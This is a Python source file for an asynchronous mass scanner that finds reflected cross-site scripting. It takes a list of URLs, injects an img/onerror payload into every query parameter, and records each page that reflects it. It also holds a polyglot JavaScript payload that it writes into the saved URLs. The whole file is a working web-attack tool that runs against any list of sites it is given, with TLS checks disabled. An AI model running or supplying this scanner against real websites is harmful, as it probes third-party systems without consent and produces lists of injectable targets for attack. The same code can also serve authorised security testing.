import time
import aiohttp
import asyncio
from colorama import Fore
from urllib.parse import urlencode, parse_qs, urlsplit, urlunsplit, urlparse, quote, urlunparse

class MassScanner:
    def __init__(self, file, output , concurrency, timeout, payload=False, redactDomains=False):
        self.file = file
        self.output = output
        self.output_file = open(output, "a")  # Open the output file once
        self.payload = self.loadPayload(payload)
        self.encodedPayload = quote(self.payload.replace(" ", "+"), safe="+")
        self.polygotPayload = quote(""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""")
        self.concurrency = concurrency
        self.timeout = timeout
        self.redactDomains = redactDomains
        self.injectables = []
        self.totalFound = 0
        self.totalScanned = 0
        self.t0 = time.time()

    @staticmethod
    def loadPayload(payload):
        default_payload = '"><img//////src=x oNlY=1 oNerror=alert(1)//'

        if payload:
            try:
                with open(payload, "r") as file:
                    return file.readline().strip()
            except:
                print(f"Error loading payload file: {payload}")
                return default_payload
        else:
            return default_payload

    @staticmethod
    def redactURL(url):
        parsedUrl = urlparse(url)
        redactedUrl = parsedUrl._replace(netloc="REDACTED")
        return urlunparse(redactedUrl)

    def generatePayloadURLs(self, url):
        urlCombinations = []
        scheme, netloc, path, queryString, fragment = urlsplit(url)
        scheme = "http"
        queryParams = parse_qs(queryString, keep_blank_values=True)
        for key in queryParams.keys():
            modifiedParams = queryParams.copy()
            modifiedParams[key] = [self.payload]
            modifiedQueryString = urlencode(modifiedParams, doseq=True)
            modifiedUrl = urlunsplit((scheme, netloc, path, modifiedQueryString, fragment))
            urlCombinations.append(modifiedUrl)

        return urlCombinations

    def saveInjectablesToFile(self):
        for url in self.injectables:
            self.output_file.write(url + "\n")
        self.injectables = []

    async def fetch(self, sem: asyncio.Semaphore, session: aiohttp.ClientSession, url: str):
        async with sem:
            try:
                responseText = ""
                async with session.get(url, allow_redirects=True) as resp:
                    responseHeaders = resp.headers

                    contentType = responseHeaders.get("Content-Type", "")
                    contentLength = int(responseHeaders.get("Content-Length", -1))

                    if "text/html" not in contentType or contentLength > 1000000:
                        resp.connection.transport.abort()
                        return (responseText, url)
                    else:
                        content = await resp.read()
                        encoding = 'utf-8'
                        responseText = content.decode(encoding, errors="ignore")
            except:
                pass

            await asyncio.sleep(0)
            return (responseText, url)

    def processTasks(self, done):
        for task in done:
            self.totalScanned += 1
            responseText, url = task
            url = url.replace(self.encodedPayload, self.polygotPayload)
            if self.payload in responseText:
                self.injectables.append(url)
                self.totalFound += 1
                print(f"{Fore.RED} [+] Vulnerable parameter found: {Fore.WHITE} {(self.redactURL(url) if self.redactDomains else url)}")

    async def scan(self):
        sem = asyncio.Semaphore(self.concurrency)
        timeout = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False, limit=0, enable_cleanup_closed=True)) as session:
            with open(self.file, "r") as urlsFile:
                line = urlsFile.readline()
                while line:
                    pending = []
                    while len(pending) < self.concurrency and line:
                        urlsWithPayload = self.generatePayloadURLs(line.strip())
                        for url in urlsWithPayload:
                            pending.append(asyncio.ensure_future(self.fetch(sem, session, url)))
                        line = urlsFile.readline()

                    done = await asyncio.gather(*pending)
                    self.processTasks(done)

                    self.saveInjectablesToFile()
                    print(f'{Fore.YELLOW} [i] Scanned {self.totalScanned} URLs. Found {self.totalFound} injectable URLs', end="\r")

    def run(self):
        print(f"{Fore.YELLOW} [i] Starting scan with {self.concurrency} concurrency")
        print(f"{Fore.YELLOW} [i] Output file: {self.output}")
        print(f"{Fore.YELLOW} [i] Timeout: {self.timeout} seconds")

        asyncio.run(self.scan())

        self.output_file.close()  # Close the output file once scanning is done
        print(f"{Fore.YELLOW} [i] Scanning finished. All URLs are saved to {self.output}")
        print(f"{Fore.YELLOW} [i] Total found: {self.totalFound}")
        print(f"{Fore.YELLOW} [i] Total scanned: {self.totalScanned}")
        print(f"{Fore.YELLOW} [i] Time taken: {int(time.time() - self.t0)} seconds")
